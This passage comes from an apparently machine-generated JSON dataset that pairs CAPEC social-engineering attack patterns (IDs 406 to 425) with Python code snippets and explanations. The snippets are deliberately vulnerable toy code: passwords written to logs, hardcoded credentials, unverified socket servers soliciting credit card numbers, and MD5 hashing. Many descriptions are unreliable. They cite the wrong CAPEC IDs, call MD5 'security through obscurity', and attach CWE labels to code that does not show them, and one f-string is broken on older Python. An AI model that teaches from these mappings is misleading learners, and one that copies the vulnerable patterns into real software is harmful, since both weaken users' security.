        "code_snippet": "import socket\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-532: Information Exposure Through Server Log Files\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to check if a domain is trusted\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com', 'secure.org']\n    try:\n        ip = socket.gethostbyname(domain)\n        logging.info(f'Domain {domain} resolved to IP {ip}')\n        return domain in trusted_domains\n    except socket.error as e:\n        logging.error(f'Error resolving domain {domain}: {e}')\n        return False\n\n# Example usage\nif is_trusted_domain('example.com'):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')",
        "description": "This Python code snippet demonstrates a deprecated attack pattern related to social information gathering via research, specifically focusing on the reliance on DNS lookups in security decisions (CWE-350) and the exposure of information through server log files (CWE-532). The `is_trusted_domain` function checks if a given domain is in a list of trusted domains by resolving its IP address using DNS lookup. The result of the DNS lookup and any errors encountered are logged to a server log file, potentially exposing sensitive information. This code highlights the risks of relying on DNS lookups for security decisions and the inadvertent exposure of information through logging."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\n\n# Simulate sensitive information\nsensitive_info = 'User: admin, Password: secret123'\n\n# Store sensitive information in a file\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate improper disposal of the file\nos.remove('sensitive_data.txt')\n\n# Simulate a core dump file being generated and exposed\ncore_dump = 'core_dump_data'\nwith open('/tmp/core_dump', 'w') as core_file:\n    core_file.write(core_dump)\n\n# Simulate exposure of version-control repository\nos.system('git init exposed_repo')\nos.system('echo \"Sensitive data\" > exposed_repo/README.md')\nos.system('git -C exposed_repo add .')\nos.system('git -C exposed_repo commit -m \"Initial commit\"')\n\n# Simulate cleartext transmission of sensitive information\nimport socket\n\nserver_address = ('localhost', 65432)\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect(server_address)\n    s.sendall(b'Sensitive information in cleartext')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. The code simulates the storage of sensitive information in a file and its improper disposal, which could be exploited by an adversary searching through discarded files. It also demonstrates the generation and exposure of a core dump file, the exposure of a version-control repository, and the cleartext transmission of sensitive information over a network. These actions represent potential points of failure where sensitive information could be inadvertently exposed to unauthorized actors, aligning with the concept of dumpster diving."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\nclass PretextingAttack:\n    def __init__(self, target_url, session_id):\n        self.target_url = target_url\n        self.session_id = session_id\n\n    def perform_attack(self):\n        # CWE-300: Channel Accessible by Non-Endpoint\n        headers = {'Authorization': f'Session {self.session_id}'}\n        response = requests.get(self.target_url, headers=headers)\n        \n        if response.status_code == 200:\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            sensitive_info = response.text\n            print(f'Sensitive Information: {sensitive_info}')\n        else:\n            print('Failed to retrieve information')\n\n# Example usage\n# CWE-384: Session Fixation\n# Attacker uses a fixed session ID to impersonate a user\nattacker = PretextingAttack('https://example.com/userinfo', 'fixed-session-id')\nattacker.perform_attack()",
        "description": "This Python code snippet demonstrates a pretexting attack where an adversary uses a fixed session ID to impersonate a user and retrieve sensitive information from a target URL. The `PretextingAttack` class is initialized with a target URL and a session ID. The `perform_attack` method sends a GET request to the target URL with the session ID in the headers, exploiting CWE-300 (Channel Accessible by Non-Endpoint) by not adequately verifying the identity of the actor. If the response is successful, it prints the sensitive information, demonstrating CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The example usage shows how an attacker might use a fixed session ID (CWE-384: Session Fixation) to perform the attack."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulated sensitive data\nuser_password = 'SuperSecretPassword123'\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.debug(f'User password is: {user_password}')\n\n# CWE-766: Critical Data Modification\nstored_data = {'balance': 1000}\n\n# Simulated modification without proper protection\nstored_data['balance'] = 0\nlogging.info(f'Account balance modified to: {stored_data['balance']}')",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to information exposure and data modification. It sets up logging to a file (CWE-532) and logs sensitive information such as a user password (CWE-534). Additionally, it shows a critical data modification without proper protection (CWE-766). The code highlights the importance of securing sensitive information and protecting stored data from unauthorized modifications."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350)\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com']\n    return domain in trusted_domains\n\n# Example usage\nif is_trusted_domain('example.com'):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')",
        "description": "This Python code snippet demonstrates deprecated security practices related to information exposure and reliance on DNS lookups for security decisions. The code logs sensitive data (user password) to a debug log file, which is a deprecated practice (CWE-532). Additionally, it includes a function that makes a security decision based on a DNS lookup, which is another deprecated practice (CWE-350). These practices are highlighted to show the importance of avoiding such vulnerabilities in real-world applications."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef handle_client(client_socket):\n    # CWE-205: Observable Behavioral Discrepancy\n    client_socket.send(b'Welcome to the secure server. Please provide your credentials.')\n    credentials = client_socket.recv(1024).decode('utf-8')\n    \n    # CWE-222: Truncation of Security-relevant Information\n    if len(credentials) > 50:\n        credentials = credentials[:50]\n    \n    # Simulate credential verification (vulnerable to CWE-940)\n    if 'admin' in credentials:\n        client_socket.send(b'Access granted. Here is the sensitive information: [Sensitive Data]')\n    else:\n        client_socket.send(b'Access denied.')\n\n    client_socket.close()\n\n# Simulate server setup\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 9999))\nserver.listen(5)\n\nwhile True:\n    client_socket, addr = server.accept()\n    handle_client(client_socket)",
        "description": "This Python code snippet demonstrates a vulnerable server that handles client connections. The server asks for credentials and grants access based on a simple check. The code embodies the main idea of CAPEC-118 (Information Elicitation) by simulating a scenario where an attacker could extract sensitive information through social engineering. The code includes several related CWEs: CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the request, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes sensitive information without proper authorization, CWE-205 (Observable Behavioral Discrepancy) as it sends different responses based on the credentials, and CWE-222 (Truncation of Security-relevant Information) as it truncates the credentials input."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import logging\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# Log sensitive information (vulnerable practice)\nlogging.debug(f'User password: {user_password}')\n\n# Simulate an authentication check\ndef authenticate(user_input):\n    if user_input == user_password:\n        return 'Access Granted'\n    else:\n        return 'Access Denied'\n\n# Example usage\nprint(authenticate('SuperSecretPassword123'))",
        "description": "This Python code snippet demonstrates a vulnerable practice related to the deprecated CAPEC-407 (Social Information Gathering via Pretexting) and the related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code configures logging to write to a file and logs sensitive information, such as a user's password. This practice can lead to information exposure if the log files are accessed by unauthorized individuals. Additionally, the code includes a simple authentication function that checks the user input against the logged password, illustrating how sensitive information can be mishandled and exposed through improper logging practices."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\nclass CustomerServiceSimulator:\n    def __init__(self, host='localhost', port=12345):\n        self.server_address = (host, port)\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(self.server_address)\n        self.server_socket.listen(1)\n\n    def start(self):\n        print('Customer Service Simulator started. Waiting for connections...')\n        while True:\n            connection, client_address = self.server_socket.accept()\n            try:\n                print(f'Connection from {client_address}')\n                connection.sendall(b'Welcome to Customer Service. Please provide your credit card number for verification: ')\n                data = connection.recv(1024)\n                print(f'Received credit card number: {data.decode()}')\n            finally:\n                connection.close()\n\nif __name__ == '__main__':\n    simulator = CustomerServiceSimulator()\n    simulator.start()",
        "description": "This Python code snippet simulates a customer service representative using a socket server to solicit sensitive information, such as a credit card number, from a client. The server listens for incoming connections and prompts the client to provide their credit card number for verification. This embodies the CAPEC 'Pretexting via Customer Service' by demonstrating how an adversary might pose as a legitimate customer service representative to extract sensitive information. The code also highlights several related CWEs: it does not verify the source of the communication (CWE-940), allows access to the channel by any client (CWE-300), and exposes sensitive information (CWE-200)."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-1263: Improper Physical Access Control\n\ndef upload_file(file_path, destination_dir):\n    # Simulate a tech support scenario where a file is uploaded\n    if not os.path.exists(destination_dir):\n        os.makedirs(destination_dir)\n    with open(file_path, 'rb') as f:\n        data = f.read()\n    # CWE-434: No validation of file type\n    with open(os.path.join(destination_dir, os.path.basename(file_path)), 'wb') as f:\n        f.write(data)\n    print(f\"File {file_path} uploaded to {destination_dir}\")\n\n# CWE-538: Sensitive information in an externally accessible directory\nsensitive_info = \"User: admin, Password: secret\"\nwith open('/tmp/external_access/sensitive_info.txt', 'w') as f:\n    f.write(sensitive_info)\nprint(\"Sensitive information written to /tmp/external_access/sensitive_info.txt\")\n\n# CWE-200 and CWE-359: Exposing sensitive information\ndef get_sensitive_info():\n    return sensitive_info\n\n# CWE-1263: Improper physical access control\nif os.path.exists('/tmp/external_access/sensitive_info.txt'):\n    print(\"Sensitive information is accessible!\")\n\n# Simulate a tech support call\nupload_file('malicious_payload.exe', '/tmp/external_access')\nprint(get_sensitive_info())",
        "description": "This Python code snippet simulates a scenario where an adversary, posing as tech support, uploads a malicious file and exposes sensitive information. The `upload_file` function demonstrates CWE-434 by allowing unrestricted file uploads without validation. Sensitive information is written to an externally accessible directory, illustrating CWE-538. The `get_sensitive_info` function exposes sensitive information, representing CWE-200 and CWE-359. Finally, the code checks for the existence of sensitive information in an accessible location, highlighting CWE-1263. This snippet embodies the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to gain unauthorized access and compromise sensitive data."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\n# Simulate a delivery person pretexting attack\nclass DeliveryPersonPretexting:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.sensitive_info = \"Sensitive Data: User credentials\"\n\n    def create_insecure_channel(self):\n        # Create a socket connection (insecure channel)\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((self.target_ip, self.target_port))\n\n    def send_sensitive_info(self):\n        # CWE-941: Incorrectly specified destination\n        # CWE-300: Channel accessible by non-endpoint\n        self.sock.sendall(self.sensitive_info.encode('utf-8'))\n        self.sock.close()\n\n    def store_sensitive_info(self):\n        # CWE-538: Insertion of sensitive information into externally-accessible file\n        with open('/tmp/delivery_info.txt', 'w') as f:\n            f.write(self.sensitive_info)\n\n# Example usage\npretexting_attack = DeliveryPersonPretexting('192.168.1.10', 8080)\npretexting_attack.create_insecure_channel()\npretexting_attack.send_sensitive_info()\npretexting_attack.store_sensitive_info()",
        "description": "This Python code snippet simulates a pretexting attack where an adversary impersonates a delivery person to solicit sensitive information. The class `DeliveryPersonPretexting` embodies the main idea of CAPEC-409 by creating an insecure communication channel (CWE-300) and sending sensitive information to an incorrectly specified destination (CWE-941). Additionally, it stores sensitive information in an externally accessible file (CWE-538). The code demonstrates how an attacker might exploit these weaknesses to gain unauthorized access to sensitive data."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import random\n\nclass PhoneSystem:\n    def __init__(self):\n        self.employees = {'Alice': 'IT', 'Bob': 'HR', 'Charlie': 'Finance'}\n        self.sensitive_info = {'Alice': 'Password123', 'Bob': 'HRFiles', 'Charlie': 'FinanceReport'}\n\n    def verify_caller(self, caller_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        if caller_id in self.employees:\n            return True\n        return False\n\n    def handle_call(self, caller_id, request):\n        if self.verify_caller(caller_id):\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            if request == 'get_info':\n                return self.sensitive_info.get(caller_id, 'No info available')\n            elif request == 'reset_password':\n                new_password = 'NewPass' + str(random.randint(1000, 9999))\n                self.sensitive_info[caller_id] = new_password\n                return f'Password reset to {new_password}'\n        else:\n            return 'Caller not verified'\n\n# Simulating a pretexting attack\nphone_system = PhoneSystem()\nprint(phone_system.handle_call('Eve', 'get_info'))  # Unauthorized caller\nprint(phone_system.handle_call('Alice', 'get_info'))  # Authorized caller",
        "description": "This Python code snippet simulates a phone system where employees can request sensitive information or reset their passwords. The `PhoneSystem` class contains a list of employees and their sensitive information. The `verify_caller` method checks if the caller is an authorized employee (CWE-940). The `handle_call` method processes the request and exposes sensitive information if the caller is verified (CWE-200). The code demonstrates a pretexting attack by showing how an unauthorized caller ('Eve') can attempt to access sensitive information, highlighting the importance of proper verification mechanisms."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\n\nclass HelpDesk:\n    def __init__(self):\n        self.sensitive_info = 'User: JohnDoe, Password: 12345'\n        self.request_count = {}\n\n    def handle_request(self, user, request):\n        if user not in self.request_count:\n            self.request_count[user] = 0\n        self.request_count[user] += 1\n\n        # CWE-799: Improper Control of Interaction Frequency\n        if self.request_count[user] > 5:\n            print('Too many requests, access denied.')\n            return\n\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if 'password reset' in request.lower():\n            print(f'Providing sensitive information: {self.sensitive_info}')\n        else:\n            print('Request handled.')\n\n        # CWE-205: Observable Behavioral Discrepancy\n        if 'admin' in user.lower():\n            print('Admin access granted.')\n        else:\n            print('Standard user access.')\n\n# Simulating social engineering attack\nhelp_desk = HelpDesk()\n\n# Adversary pretending to be a supervisor\nfor i in range(7):\n    help_desk.handle_request('Supervisor', 'Password reset')\n    time.sleep(1)\n\n# Adversary trying to infer information\nhelp_desk.handle_request('admin', 'Check status')\nhelp_desk.handle_request('user', 'Check status')",
        "description": "This Python code snippet simulates a help desk system that handles user requests. It embodies the CAPEC concept of 'Manipulate Human Behavior' by demonstrating how an adversary might exploit human behavior to gain sensitive information. The code includes vulnerabilities related to the specified CWEs:\n\n1. CWE-799: The system does not properly limit the number of requests from a user, allowing an adversary to make multiple requests to extract information.\n2. CWE-200: The system exposes sensitive information (e.g., user credentials) when handling specific requests, such as a password reset.\n3. CWE-205: The system's behavior changes based on the user's role (admin vs. standard user), which can be observed and exploited by an adversary.\n\nThe code simulates a social engineering attack where an adversary pretends to be a supervisor to request a password reset multiple times and tries to infer information by observing the system's behavior when different user roles make requests."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to simulate login\ndef login(username, password):\n    # CWE-654: Single factor authentication\n    if username in users and users[username] == hashlib.md5(password.encode()).hexdigest():\n        print(\"Login successful!\")\n    else:\n        print(\"Login failed!\")\n\n# Function to simulate a social engineering attack\ndef social_engineering_attack():\n    # CWE-656: Security through obscurity\n    print(\"Attempting to exploit user's perception...\")\n    # CWE-205: Observable behavioral discrepancy\n    print(\"Observing login behavior...\")\n    # CWE-222: Truncation of security-relevant information\n    print(\"Truncating error messages...\")\n    # CWE-301: Reflection attack\n    print(\"Using reflection attack to impersonate user...\")\n    login('user1', 'password')  # Attacker knows the password through social engineering\n\n# Simulate the attack\nsocial_engineering_attack()",
        "description": "This Python code snippet demonstrates a simplified scenario of a social engineering attack, where an adversary exploits the target's perception to gain unauthorized access. The code includes a simulated user database with a single user and a login function that relies on single-factor authentication (CWE-654). The password is stored using MD5 hashing, which is a weak security mechanism relying on obscurity (CWE-656). The social engineering attack function simulates the adversary's actions, including observing login behavior (CWE-205), truncating error messages (CWE-222), and using a reflection attack to impersonate the user (CWE-301). The attack is successful because the adversary has manipulated the target into revealing their password."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-222: Truncation of Security-relevant Information\n\ndef create_socket_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {str(e)[:10]}\")  # CWE-222: Truncation of Security-relevant Information\n        return None\n\n# Simulate a social engineering attack\n# CWE-940: No verification of the source\n# CWE-941: Incorrectly specified destination\n# CWE-300: Channel accessible by non-endpoint\n# CWE-301: Reflection attack\n\ndef social_engineering_attack(target_host, target_port):\n    s = create_socket_connection(target_host, target_port)\n    if s:\n        try:\n            # Compliment followed by a question to elicit sensitive information\n            s.sendall(b\"You are doing a great job! Can you tell me your password?\")\n            response = s.recv(1024)\n            print(f\"Received: {response}\")\n        except Exception as e:\n            print(f\"Communication error: {str(e)[:10]}\")  # CWE-222: Truncation of Security-relevant Information\n        finally:\n            s.close()\n\n# Example usage\nsocial_engineering_attack('example.com', 80)",
        "description": "This Python code snippet demonstrates a simplified version of a social engineering attack, where an adversary attempts to elicit sensitive information from a target by creating a sense of obligation. The code establishes a socket connection to a specified host and port without verifying the source or destination of the communication channel (CWE-940, CWE-941). It then sends a message that includes a compliment followed by a question, aiming to influence the target to reveal sensitive information (CAPEC: Influence Perception of Reciprocation). The code also includes potential vulnerabilities such as truncation of error messages (CWE-222) and the possibility of a reflection attack (CWE-301)."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket and wrap it with SSL\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwrapped_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)\n\n# Connect to a server\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request\nwrapped_socket.send(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n\n# Receive a response\nresponse = wrapped_socket.recv(4096)\nprint(response)\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of an SSL/TLS connection where the SSL version is explicitly set to TLSv1, which is an older and less secure protocol. This embodies the idea of 'Selection of Less-Secure Algorithm During Negotiation' (CWE-757). An attacker could exploit this by forcing the use of a weaker encryption algorithm, making the communication channel less secure. Additionally, the code does not handle potential discrepancies in server responses (CWE-203 and CWE-205), which could reveal security-relevant information about the state of the product. The incorrect specification of the SSL version (CWE-941) and potential interpretation conflicts (CWE-436) are also represented in this code."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\nimport random\n\n# Simulate a perception of scarcity\nclass ScarcityInfluence:\n    def __init__(self):\n        self.items = ['item1', 'item2', 'item3']\n        self.stock = {item: random.randint(1, 5) for item in self.items}\n\n    def display_items(self):\n        for item, count in self.stock.items():\n            print(f'{item}: {count} left')\n\n    def purchase_item(self, item):\n        if self.stock[item] > 0:\n            self.stock[item] -= 1\n            print(f'Purchased {item}. {self.stock[item]} left.')\n        else:\n            print(f'{item} is out of stock!')\n\n# Simulate a user decision influenced by scarcity\nscarcity = ScarcityInfluence()\nscarcity.display_items()\n\n# User is influenced to make a quick decision\nuser_choice = 'item1'\nscarcity.purchase_item(user_choice)\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Here, the decision to purchase is based solely on the perceived scarcity\nif scarcity.stock[user_choice] == 0:\n    print('Hurry! Last item purchased!')\n\n# CWE-405: Asymmetric Resource Consumption\n# Simulate a situation where the adversary can cause resource consumption\nfor _ in range(1000):\n    scarcity.purchase_item('item2')\n\n# CWE-656: Reliance on Security Through Obscurity\n# The stock levels are not securely managed and can be manipulated\nscarcity.stock['item3'] = 0\nscarcity.purchase_item('item3')\n\n# CWE-222: Truncation of Security-relevant Information\n# Displaying only limited information about stock levels\nprint(f'Limited stock information: {scarcity.stock}')\n\n# CWE-205: Observable Behavioral Discrepancy\n# The behavior changes when stock is low, revealing internal state\nscarcity.purchase_item('item1')",
        "description": "This Python code snippet simulates a scenario where an adversary leverages the perception of scarcity to influence a user's decision-making process. The `ScarcityInfluence` class initializes a stock of items with random quantities and provides methods to display and purchase items. The code demonstrates how a user might be influenced to make a quick purchase decision based on the perceived scarcity of an item (CWE-654). It also shows how an adversary can cause asymmetric resource consumption by repeatedly purchasing an item (CWE-405). The stock levels are not securely managed, representing reliance on security through obscurity (CWE-656). Limited stock information is displayed, which can truncate security-relevant information (CWE-222). Finally, the code shows observable behavioral discrepancies when stock levels change, revealing internal state information (CWE-205)."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef impersonate_authority(target_ip, target_port):\n    # Create a socket connection to the target\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # Send a message impersonating an authority figure\n    authority_message = 'AUTH: Admin\\nPlease provide your credentials.'\n    s.sendall(authority_message.encode('utf-8'))\n\n    # Receive the response from the target\n    response = s.recv(1024)\n    print('Received:', response.decode('utf-8'))\n\n    # CWE-222: Truncation of Security-relevant Information\n    # Truncate the response to hide potential security-relevant information\n    truncated_response = response[:50]\n    print('Truncated Response:', truncated_response.decode('utf-8'))\n\n    s.close()\n\n# Example usage\nimpersonate_authority('192.168.1.10', 8080)",
        "description": "This Python code snippet demonstrates a simple example of an adversary using social engineering to impersonate an authority figure and extract sensitive information from a target. The code connects to a target machine via a socket (CWE-300, CWE-940) and sends a message pretending to be an admin (CWE-301). The response from the target is received and then truncated (CWE-222) to obscure potential security-relevant information. The code also relies on a single factor (the authority message) to deceive the target (CWE-654). This snippet embodies the main idea of CAPEC 'Influence Perception of Authority' by showing how an attacker might exploit perceived authority to gain unauthorized access."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineer:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.session = requests.Session()\n\n    def send_initial_request(self):\n        response = self.session.get(self.target_url)\n        if response.status_code == 200:\n            print('Initial request successful')\n            return True\n        return False\n\n    def send_follow_up_requests(self):\n        for i in range(5):  # CWE-799: No limit on the number of requests\n            response = self.session.get(self.target_url)\n            if response.status_code == 200:\n                print(f'Follow-up request {i+1} successful')\n            else:\n                print(f'Follow-up request {i+1} failed')\n\n    def execute(self):\n        if self.send_initial_request():\n            self.send_follow_up_requests()\n\n# CWE-940: No verification of the source of the request\n# CWE-203: Observable discrepancy in responses\n# CWE-205: Behavioral discrepancy observable\n# CWE-444: Potential for HTTP request smuggling\n\nif __name__ == '__main__':\n    target_url = 'http://example.com'\n    engineer = SocialEngineer(target_url)\n    engineer.execute()",
        "description": "This Python code snippet demonstrates a simplified social engineering attack where an adversary sends an initial request to a target URL and, upon success, sends multiple follow-up requests. The code embodies the CAPEC concept of 'Influence Perception of Commitment and Consistency' by first making a minor request and then escalating to multiple similar requests. The code also highlights several related CWEs: CWE-799 (Improper Control of Interaction Frequency) by not limiting the number of follow-up requests, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the requests, CWE-203 and CWE-205 (Observable Discrepancy and Observable Behavioral Discrepancy) by potentially revealing information through different responses, and CWE-444 (Inconsistent Interpretation of HTTP Requests) by not handling malformed requests consistently."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import hashlib\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.users = {'trusted_user': '5f4dcc3b5aa765d61d8327deb882cf99'}  # 'password' hashed with MD5\n        self.session_tokens = {}\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            token = self.generate_token(username)\n            self.session_tokens[username] = token\n            return token\n        return None\n\n    def generate_token(self, username):\n        return hashlib.md5(username.encode()).hexdigest()\n\n    def access_resource(self, token):\n        for user, user_token in self.session_tokens.items():\n            if user_token == token:\n                return f\"Access granted to {user}\"\n        return \"Access denied\"\n\n# Adversary's code\nclass Adversary:\n    def __init__(self, auth_system):\n        self.auth_system = auth_system\n\n    def reflection_attack(self, target_username):\n        # Adversary uses the target's machine to authenticate as the trusted user\n        token = self.auth_system.authenticate(target_username, 'password')\n        if token:\n            return self.auth_system.access_resource(token)\n        return \"Attack failed\"\n\n# Example usage\nauth_system = AuthenticationSystem()\nadversary = Adversary(auth_system)\nprint(adversary.reflection_attack('trusted_user'))",
        "description": "This Python code snippet demonstrates a simplified authentication system vulnerable to a reflection attack, embodying the CAPEC concept of 'Influence Perception of Liking'. The `AuthenticationSystem` class uses a single factor (username and password) for authentication, which is a weak point (CWE-654). The password is stored using MD5 hashing, which is not secure (CWE-656). The `Adversary` class simulates an attacker who uses the target's machine to authenticate as a trusted user by exploiting the reflection attack vulnerability (CWE-301). The adversary's code attempts to authenticate using the known password of the trusted user and then access a resource using the obtained session token. This demonstrates how an adversary can influence the target's actions by exploiting weak security mechanisms."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass VotingSystem:\n    def __init__(self):\n        self.votes = {'A': 0, 'B': 0}\n        self.user_votes = {}\n\n    def vote(self, user, choice):\n        if user in self.user_votes:\n            print(\"User has already voted.\")\n            return\n        if choice not in self.votes:\n            print(\"Invalid choice.\")\n            return\n        self.user_votes[user] = choice\n        self.votes[choice] += 1\n        self.display_votes()\n\n    def display_votes(self):\n        total_votes = sum(self.votes.values())\n        if total_votes == 0:\n            print(\"No votes yet.\")\n            return\n        for choice, count in self.votes.items():\n            print(f\"{choice}: {count} votes ({(count / total_votes) * 100:.2f}%)\")\n\n    def get_winner(self):\n        return max(self.votes, key=self.votes.get)\n\n# Simulate voting\nvoting_system = VotingSystem()\nvoting_system.vote('user1', 'A')\nvoting_system.vote('user2', 'A')\nvoting_system.vote('user3', 'B')\nvoting_system.vote('user4', 'A')\nvoting_system.vote('user5', 'B')\nvoting_system.vote('user6', 'A')\n\nprint(f\"Winner: {voting_system.get_winner()}\")",
        "description": "This Python code snippet represents a simple voting system where users can vote for either 'A' or 'B'. The system keeps track of the votes and displays the current vote count and percentages after each vote. The main idea of the CAPEC 'Influence Perception of Consensus or Social Proof' is embodied in the 'display_votes' method, which shows the current voting results. This can influence subsequent voters to follow the majority, leveraging the human tendency to conform to perceived consensus. The related CWEs are represented as follows: CWE-205 and CWE-203 are demonstrated by the observable vote counts and percentages, which can reveal the internal state of the voting system. CWE-654 is shown by the reliance on a single factor (the user's vote) to update the vote count. CWE-301 is not directly represented in this snippet but could be relevant in a more complex authentication scenario. CWE-207 is illustrated by the system's behavior being observable and potentially different from other voting systems."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import requests\n\nclass FramingInfluence:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def send_request(self, data):\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        # CWE-300: Channel Accessible by Non-Endpoint\n        response = requests.post(self.target_url, json=data)\n        return response\n\n    def influence_target(self, data):\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        if 'important_key' in data:\n            data['important_key'] = 'framed_value'\n        return self.send_request(data)\n\n# Example usage\nframer = FramingInfluence('http://example.com/api')\ndata = {'important_key': 'original_value', 'other_key': 'some_value'}\nresponse = framer.influence_target(data)\nprint(response.status_code)",
